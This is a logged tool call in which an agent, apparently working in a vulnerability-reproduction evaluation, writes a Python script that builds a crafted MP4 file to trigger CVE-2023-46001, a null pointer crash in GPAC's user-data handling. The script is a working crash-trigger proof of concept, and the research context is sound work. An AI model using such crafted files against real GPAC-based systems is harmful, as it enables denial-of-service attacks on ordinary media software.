  write_file with args {'file_path': '/home/ubuntu/PoV/DrillAgent/eval/workspace-wo-crash-trigger/gpac.cve-2023-46001/round4/gen_testcase_round4.py', 'content': '#!/usr/bin/env python3\n"""\nGenerate a valid MP4 file with UUID userdata to trigger CVE-2023-46001.\n\nThe vulnerability: null pointer dereference in gf_isom_get_user_data() when it\nencounters a UUID userdata entry while being called with UUID=NULL parameter.\n"""\n\nimport struct\n\ndef write_box(fourcc, data):\n    """Write an MP4 box with size + fourcc + data."""\n    size = 8 + len(data)\n    return struct.pack(\'>I4s\', size, fourcc.encode(\'ascii\')) + data\n\ndef write_fullbox(fourcc, version, flags, data):\n    """Write a full box (with version/flags)."""\n    size = 8 + 4 + len(data)\n    return struct.pack(\'>I4sBBBB\', size, fourcc.encode(\'ascii\'),\n                      version, (flags >> 16) & 0xFF, (flags >> 8) & 0xFF, flags & 0xFF) + data\n\noutput_path = \'/home/ubuntu/PoV/DrillAgent/eval/workspace-wo-crash-trigger/gpac.cve-2023-46001/round4/testcase-round4\'\n\nwith open(output_path, \'wb\') as f:\n    # 1. ftyp box\n    ftyp_data = b\'isom\' + struct.pack(\'>I\', 0x200) + b\'isomiso2avc1mp41\'\n    f.write(write_box(\'ftyp\', ftyp_data))\n    \n    # 2. moov box\n    moov_parts = []\n    \n    # 2.1 mvhd box (movie header)\n    mvhd_data = struct.pack(\'>IIIIHH\', 0, 0, 1000, 1000, 0x00010000, 0x0100)\n    mvhd_data += b\'\\x00\\x00\' + b\'\\x00\' * 8  # reserved\n    # Unity matrix (3x3)\n    mvhd_data += struct.pack(\'>9I\', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)\n    mvhd_data += b\'\\x00\' * 24  # pre_defined\n    mvhd_data += struct.pack(\'>I\', 2)  # next_track_ID\n    moov_parts.append(write_fullbox(\'mvhd\', 0, 0, mvhd_data))\n    \n    # 2.2 trak box\n    trak_parts = []\n    \n    # 2.2.1 tkhd box (track header)\n    tkhd_flags = 0x07  # track_enabled | track_in_movie | track_in_preview\n    tkhd_data = struct.pack(\'>IIIIHH\', 0, 0, 1, 0, 1000, 0)\n    tkhd_data += struct.pack(\'>hh\', 0, 0)  # layer, alternate_group\n    tkhd_data += struct.pack(\'>HH\', 0, 0)  # volume, reserved\n    # Unity matrix\n    tkhd_data += struct.pack(\'>9I\', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)\n    tkhd_data += struct.pack(\'>II\', 320 << 16, 240 << 16)  # width, height\n    trak_parts.append(write_fullbox(\'tkhd\', 0, tkhd_flags, tkhd_data))\n    \n    # 2.2.2 mdia box (media)\n    mdia_parts = []\n    \n    # mdhd box (media header)\n    mdhd_data = struct.pack(\'>IIIIHH\', 0, 0, 1000, 1000, 0x55c4, 0)  # language=\'und\'\n    mdia_parts.append(write_fullbox(\'mdhd\', 0, 0, mdhd_data))\n    \n    # hdlr box (handler)\n    hdlr_data = struct.pack(\'>I\', 0) + b\'\\x00\\x00\\x00\\x00\'  # pre_defined\n    hdlr_data += b\'vide\' + b\'\\x00\' * 12  # handler_type, reserved\n    hdlr_data += b\'VideoHandler\\x00\'\n    mdia_parts.append(write_fullbox(\'hdlr\', 0, 0, hdlr_data))\n    \n    # minf box (media information)\n    minf_parts = []\n    \n    # vmhd box (video media header)\n    vmhd_data = struct.pack(\'>HHHH\', 0, 0, 0, 0)  # graphicsmode, opcolor[3]\n    minf_parts.append(write_fullbox(\'vmhd\', 0, 1, vmhd_data))\n    \n    # dinf box (data information)\n    url_data = b\'\'  # flags=1 means self-contained\n    dref_entry = write_fullbox(\'url \', 0, 1, url_data)\n    dref_data = struct.pack(\'>I\', 1) + dref_entry  # entry_count=1\n    dinf_data = write_fullbox(\'dref\', 0, 0, dref_data)\n    minf_parts.append(write_box(\'dinf\', dinf_data))\n    \n    # stbl box (sample table)\n    stbl_parts = []\n    \n    # stsd box (sample description)\n    # avc1 visual sample entry\n    avc1_data = b\'\\x00\' * 6 + struct.pack(\'>H\', 1)  # reserved[6], data_reference_index\n    avc1_data += b\'\\x00\' * 16  # pre_defined, reserved\n    avc1_data += struct.pack(\'>HH\', 320, 240)  # width, height\n    avc1_data += struct.pack(\'>II\', 0x00480000, 0x00480000)  # horizresolution, vertresolution\n    avc1_data += struct.pack(\'>I\', 0)  # reserved\n    avc1_data += struct.pack(\'>H\', 1)  # frame_count\n    avc1_data += b\'\\x00\' * 32  # compressorname[32]\n    avc1_data += struct.pack(\'>HH\', 0x0018, 0xffff)  # depth, pre_defined\n    \n    # avcC box (AVC decoder configuration)\n    avcc_data = struct.pack(\'>BBBBBB\', 1, 0x42, 0, 0x1e, 0xff, 0xe1)\n    sps = b\'\\x67\\x42\\x00\\x1e\\x8c\\x8d\\x40\\x50\\x1e\\xd0\\x0f\\x08\\x84\\x6a\'\n    avcc_data += struct.pack(\'>H\', len(sps)) + sps\n    avcc_data += struct.pack(\'>B\', 1)  # numOfPPS\n    pps = b\'\\x68\\xce\\x3c\\x80\'\n    avcc_data += struct.pack(\'>H\', len(pps)) + pps\n    avc1_data += write_box(\'avcC\', avcc_data)\n    \n    avc1_box = write_box(\'avc1\', avc1_data)\n    stsd_data = struct.pack(\'>I\', 1) + avc1_box  # entry_count=1\n    stbl_parts.append(write_fullbox(\'stsd\', 0, 0, stsd_data))\n    \n    # stts box (time-to-sample)\n    stts_data = struct.pack(\'>I\', 1) + struct.pack(\'>II\', 1, 1000)\n    stbl_parts.append(write_fullbox(\'stts\', 0, 0, stts_data))\n    \n    # stsc box (sample-to-chunk)\n    stsc_data = struct.pack(\'>I\', 1) + struct.pack(\'>III\', 1, 1, 1)\n    stbl_parts.append(write_fullbox(\'stsc\', 0, 0, stsc_data))\n    \n    # stsz box (sample size)\n    stsz_data = struct.pack(\'>II\', 0, 1) + struct.pack(\'>I\', 100)\n    stbl_parts.append(write_fullbox(\'stsz\', 0, 0, stsz_data))\n    \n    # stco box (chunk offset) - point to mdat\n    mdat_offset = 8 + len(ftyp_data) + 8  # ftyp + mdat header\n    stco_data = struct.pack(\'>I\', 1) + struct.pack(\'>I\', mdat_offset)\n    stbl_parts.append(write_fullbox(\'stco\', 0, 0, stco_data))\n    \n    minf_parts.append(write_box(\'stbl\', b\'\'.join(stbl_parts)))\n    mdia_parts.append(write_box(\'minf\', b\'\'.join(minf_parts)))\n    trak_parts.append(write_box(\'mdia\', b\'\'.join(mdia_parts)))\n    \n    # 2.2.3 udta box (user data) - THE VULNERABILITY TRIGGER!\n    # Add a UUID box to trigger the crash when gf_isom_get_user_data() is called with UUID=NULL\n    udta_parts = []\n    uuid_value = b\'\\x12\\x34\\x56\\x78\\x9a\\xbc\\xde\\xf0\\x12\\x34\\x56\\x78\\x9a\\xbc\\xde\\xf0\'  # 16-byte UUID\n    uuid_payload = b\'crash_trigger_data\'\n    uuid_box = struct.pack(\'>I4s\', 8 + 16 + len(uuid_payload), b\'uuid\') + uuid_value + uuid_payload\n    udta_parts.append(uuid_box)\n    \n    trak_parts.append(write_box(\'udta\', b\'\'.join(udta_parts)))\n    \n    moov_parts.append(write_box(\'trak\', b\'\'.join(trak_parts)))\n    \n    moov_box = write_box(\'moov\', b\'\'.join(moov_parts))\n    \n    # Calculate total size and write in correct order: ftyp, mdat, moov\n    mdat_data = b\'\\x00\' * 100\n    mdat_box = write_box(\'mdat\', mdat_data)\n    \n    # Write file: ftyp, mdat, moov\n    f.seek(0)\n    f.write(write_box(\'ftyp\', ftyp_data))\n    f.write(mdat_box)\n    f.write(moov_box)\n\nprint(f"Generated testcase at {output_path}")\n'}
